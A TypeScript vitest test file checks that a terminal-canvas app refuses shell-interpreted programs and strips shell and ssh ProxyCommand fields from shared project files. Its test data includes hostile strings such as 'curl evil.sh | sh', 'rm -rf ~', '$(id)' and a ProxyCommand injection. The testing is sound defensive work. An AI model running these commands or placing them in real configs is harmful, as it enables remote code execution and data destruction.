import { describe, it, expect } from 'vitest'
import type { CanvasNodeState } from './types'
import {
  applyLocalNodeExec,
  localNodeExec,
  safeSessionProgram,
  stripSharedNodeExec
} from './node-exec'

const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc',
  kind: 'terminal',
  position: { x: 0, y: 0 },
  size: { width: 400, height: 300 },
  title: 't',
  color: '#fff',
  group: null,
  ...over
})

describe('safeSessionProgram', () => {
  it('accepts a plain program or an absolute path', () => {
    expect(safeSessionProgram('bash')).toBe('bash')
    expect(safeSessionProgram('/bin/zsh')).toBe('/bin/zsh')
    expect(safeSessionProgram('/usr/local/bin/fish')).toBe('/usr/local/bin/fish')
    expect(safeSessionProgram('ssh')).toBe('ssh')
    expect(safeSessionProgram('  /bin/zsh  ')).toBe('/bin/zsh')
  })

  it('refuses anything a shell would interpret — tmux runs a lone command through a shell', () => {
    // Exactly the payloads a cloned .nodeterm/project.json could ship.
    expect(safeSessionProgram('curl evil.sh | sh')).toBeUndefined()
    expect(safeSessionProgram('/bin/sh -c "curl evil.sh|sh"')).toBeUndefined()
    expect(safeSessionProgram('bash; rm -rf ~')).toBeUndefined()
    expect(safeSessionProgram('bash && whoami')).toBeUndefined()
    expect(safeSessionProgram('$(id)')).toBeUndefined()
    expect(safeSessionProgram('`id`')).toBeUndefined()
    expect(safeSessionProgram('bash\nrm -rf /')).toBeUndefined()
    expect(safeSessionProgram('bash > /tmp/x')).toBeUndefined()
  })

  it('refuses an option-looking program (tmux would read it as a flag) and empty values', () => {
    expect(safeSessionProgram('-c')).toBeUndefined()
    expect(safeSessionProgram('')).toBeUndefined()
    expect(safeSessionProgram('   ')).toBeUndefined()
    expect(safeSessionProgram(undefined)).toBeUndefined()
  })
})

describe('stripSharedNodeExec', () => {
  it('removes shell and ssh.extraArgs before a project file is written', () => {
    const [n] = stripSharedNodeExec([
      node({
        shell: '/bin/zsh',
        ssh: { host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id', extraArgs: '-o ProxyCommand=evil' }
      })
    ])
    expect(n.shell).toBeUndefined()
    expect(n.ssh?.extraArgs).toBeUndefined()
    // The rest of the connection must survive — a node has to reattach to its host.
    expect(n.ssh).toEqual({ host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id' })
    expect(JSON.stringify(n)).not.toContain('ProxyCommand')
  })

  it('leaves nodes with no exec fields untouched (same object)', () => {
    const nodes = [node({ cwd: '/a' })]
    expect(stripSharedNodeExec(nodes)[0]).toBe(nodes[0])
  })
})

describe('localNodeExec / applyLocalNodeExec', () => {
  it("round-trips the local user's own custom shell and ssh args through the machine-local index", () => {
    const live = [
      node({ id: 'n1', shell: '/bin/zsh' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h' } })
    ]
    const local = localNodeExec(live)
    expect(local).toEqual({
      n1: { shell: '/bin/zsh' },
      n2: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
    // What the SHARED file carries (nothing) …
    const onDisk = stripSharedNodeExec(live)
    // … re-hydrated with what THIS machine typed → the user's setup still works after a restart.
    const back = applyLocalNodeExec(onDisk, local)
    expect(back[0].shell).toBe('/bin/zsh')
    expect(back[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })

  it('no overlay → the values in the FILE are dropped, not adopted (cloned/hostile project.json)', () => {
    const hostile = [
      node({ id: 'n1', shell: 'curl evil.sh | sh' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
    ]
    const loaded = applyLocalNodeExec(hostile, undefined)
    expect(loaded[0].shell).toBeUndefined()
    expect(loaded[1].ssh?.extraArgs).toBeUndefined()
    expect(loaded[1].ssh?.host).toBe('h') // the connection itself still persists
  })

  it('an overlay for OTHER nodes cannot vouch for a hostile value on this one', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh' })]
    const loaded = applyLocalNodeExec(hostile, { n2: { shell: '/bin/zsh' } })
    expect(loaded[0].shell).toBeUndefined()
  })

  it('a foreign file that reuses a local node id still only gets the LOCAL value', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh' })]
    const loaded = applyLocalNodeExec(hostile, { n1: { shell: '/bin/zsh' } })
    expect(loaded[0].shell).toBe('/bin/zsh')
  })

  it('returns undefined when there is nothing machine-local to keep', () => {
    expect(localNodeExec([node()])).toBeUndefined()
  })
})
